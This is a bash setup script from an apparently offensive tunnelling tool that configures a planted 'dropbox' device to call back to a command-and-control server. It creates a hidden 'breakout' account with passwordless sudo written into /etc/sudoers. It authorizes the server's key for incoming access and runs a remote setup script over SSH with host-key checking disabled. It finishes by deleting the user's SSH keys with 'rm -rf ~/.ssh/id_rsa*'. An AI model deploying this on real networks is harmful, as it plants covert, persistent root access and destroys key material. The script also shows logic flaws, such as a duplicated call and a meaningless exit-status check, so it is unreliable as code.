#!/bin/bash
#title          :setup_auto_tunnel.sh
#description    :Sets up the client-server key exchange for auto-tunneling.
#author         :Robin Lennox
#==============================================================================

function banner {
    if which tput >/dev/null 2>&1; then
        ncolors=$(tput colors)
    fi
    if [ -t 1 ] && [ -n "$ncolors" ] && [ "$ncolors" -ge 8 ]; then
      RED="$(tput setaf 1)"
      YELLOW="$(tput setaf 3)"
      NORMAL="$(tput sgr0)"
    else
      RED=""
      YELLOW=""
      NORMAL=""
    fi

    printf "${RED}"
    echo '        ____                 _               _    '
    echo '       |  _ \               | |             | |   '
    echo '       | |_) |_ __ ___  __ _| | _____  _   _| |_  '
    echo '       |  _ <| '"'"'__/ _ \/ _` | |/ / _ \| | | | __| '
    echo '       | |_) | | |  __/ (_| |   < (_) | |_| | |_  '
    echo '       |____/|_|  \___|\__,_|_|\_\___/ \__,_|\__| '
    printf "${YELLOW}"
    echo '       #Coded By Robin Lennox - @robberbear      ....let the setup begin!'
    printf "${NORMAL}"
}


function addUser {
    # Generate standalone key for breakout auto-tunnels (no local user needed)
    KEY_DIR="/opt/breakout/keys"
    KEY_PATH="${KEY_DIR}/id_rsa"
    
    echo "[+] Generating breakout tunnel key at ${KEY_PATH}"
    mkdir -p "${KEY_DIR}"
    if [ ! -f "${KEY_PATH}" ]; then
        ssh-keygen -f "${KEY_PATH}" -N "" > /dev/null 2>&1
    fi
    chown -R root:root "${KEY_DIR}"
    chmod 700 "${KEY_DIR}"
    chmod 600 "${KEY_PATH}"

    # Setup the local 'breakout' user so the server can access this device
    # (If running in Docker, this creates the user inside the container)
    if ! id "breakout" >/dev/null 2>&1; then
        echo "[+] Creating local 'breakout' user for incoming access"
        # Debian/Ubuntu style useradd since alpine's adduser -D doesn't work everywhere
        useradd -m -s /bin/bash breakout 2>/dev/null || adduser --disabled-password --gecos "" breakout 2>/dev/null
        
        mkdir -p /home/breakout/.ssh
        password=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
        ssh -o StrictHostKeyChecking=no ${sshLogin} -p${sshPort} cat /opt/breakout/keys/id_rsa.pub > /home/breakout/.ssh/authorized_keys
        echo -e "${password}\n${password}" | passwd breakout >/dev/null 2>&1
        echo "breakout ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
        chown -R breakout:breakout /home/breakout
        chmod 700 /home/breakout/.ssh
        chmod 600 /home/breakout/.ssh/authorized_keys
    fi
}

function setupCnCUser {
    # We use a unique username for this dropsbox based on its hostname and a random id
    rand_id=$(( ( RANDOM % 1000 ) + 1 ))
    username="tunnel-$(hostname)-${rand_id}"

    echo "[+] Setting up root SSH keys to communicate with server"
    addUser

    SSH_COPY_OPTS=(-o "StrictHostKeyChecking=no")
    SSH_OPTS=(-o "StrictHostKeyChecking=no")
    
    if [ -n "$HOST_SSH_KEY" ] && [ -f "$HOST_SSH_KEY" ]; then
        SSH_COPY_OPTS+=(-o "IdentityFile=$HOST_SSH_KEY")
        SSH_OPTS+=(-o "IdentityFile=$HOST_SSH_KEY")
    fi

    if [ "$VERBOSE" -eq 1 ]; then
        echo "[DEBUG] Running: ssh-copy-id -i /opt/breakout/keys/id_rsa.pub ${SSH_COPY_OPTS[@]} -p ${sshPort} ${sshLogin}"
    fi

    COPY_OUTPUT=$(ssh-copy-id -i /opt/breakout/keys/id_rsa.pub "${SSH_COPY_OPTS[@]}" -p ${sshPort} ${sshLogin} 2>&1)
    if [ $? -ne 0 ]; then
        if [ "$VERBOSE" -eq 1 ]; then
            echo "[!] Remote setup failed: $COPY_OUTPUT"
            echo "[!] Command was: ssh-copy-id -i /opt/breakout/keys/id_rsa.pub ${SSH_COPY_OPTS[@]} -p ${sshPort} ${sshLogin}"
        else
            echo "[!] Remote setup failed"
        fi
        exit 1
    fi

    addUser

    sshPub=$(cat /opt/breakout/keys/id_rsa.pub | base64 | tr -d '\n')

    echo "[+] Creating user ${username} remotely"
    
    LOCAL_SCRIPT="/opt/breakout/setup/add_user_remote.sh"
    if [ ! -f "$LOCAL_SCRIPT" ]; then
        echo "[!] LOCAL_SCRIPT $LOCAL_SCRIPT not found. Cannot set up remote user."
        exit 1
    fi

    if [ "$VERBOSE" -eq 1 ]; then
        echo "[DEBUG] Running: ssh ${SSH_OPTS[@]} -p${sshPort} ${sshLogin} \"bash -s\" < $LOCAL_SCRIPT ${username} \"${sshPub}\" \"${clientDesc}\""
    fi

    SSH_OUTPUT=$(ssh "${SSH_OPTS[@]}" -p${sshPort} ${sshLogin} "bash -s" < "$LOCAL_SCRIPT" ${username} "${sshPub}" "${clientDesc}" 2>&1)
    echo ${SSH_OUTPUT}
    if [ $? -ne 0 ]; then
        if [ "$VERBOSE" -eq 1 ]; then
            echo "[!] Remote setup failed: $SSH_OUTPUT"
            echo "[!] Command was: ssh ${SSH_OPTS[@]} -p${sshPort} ${sshLogin} \"bash -s\" < $LOCAL_SCRIPT ${username} \"${sshPub}\" \"${clientDesc}\""
        else
            echo "[!] Remote setup failed"
        fi
        exit 1
    fi

    echo "[+] Remote setup complete."
    
    # Automatically update config.ini
    CONFIG_PATH="$(pwd)/configs/config.ini"
    if [ -f "$CONFIG_PATH" ]; then
        echo "[+] Updating ${CONFIG_PATH} with new SSHUSER"
        sed -i.bak "s/^SSHUSER.*/SSHUSER = ${username}/" "$CONFIG_PATH"
        rm -f "${CONFIG_PATH}.bak"
    else
        echo "[!] Auto-update failed: Make sure to update your config.ini"
        echo "    SSHKEY = /opt/breakout/keys/id_rsa"
        echo "    SSHUSER = ${username}"
    fi
}


# Make sure parameters are set
sshLogin=$1
sshPort=$2
clientDesc=$3

VERBOSE=0
shift 3
while [ "$1" != "" ]; do
    case $1 in
        -v | --verbose ) VERBOSE=1 ;;
    esac
    shift
done

if [ -z "${sshLogin}" ] || [ -z "${sshPort}" ] || [ -z "${clientDesc}" ]; then
  echo "[+] Installing only client packages"
  echo "[x] For auto tunnel to work a port needs to be specified. E.G bash $(basename -- "$0") root@1.2.3.4 22 \"Dropped at Office 123\""
  banner
  exit 1
fi

banner
setupCnCUser
rm -rf ~/.ssh/id_rsa*